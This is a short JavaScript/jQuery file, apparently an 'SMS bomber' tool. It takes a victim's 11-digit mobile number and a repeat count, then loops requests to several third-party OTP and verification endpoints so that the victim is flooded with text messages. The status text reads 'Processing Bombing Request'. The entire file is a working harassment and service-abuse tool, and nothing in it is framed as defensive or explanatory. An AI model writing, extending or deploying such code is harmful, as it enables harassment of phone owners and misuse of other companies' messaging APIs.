// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
             
                {
                    method: 'GET',
                    url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${mobile}`
                },
              {
                  method: 'GET',
                  url: ` https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobile}`
              },
              {
                  method: 'GET',
                  url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${mobile}`
              },
              {
                  method: 'GET',
                  url: `https://ultranetrn.com.br/fonts/api.php?number=${mobile}`
              }
              

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})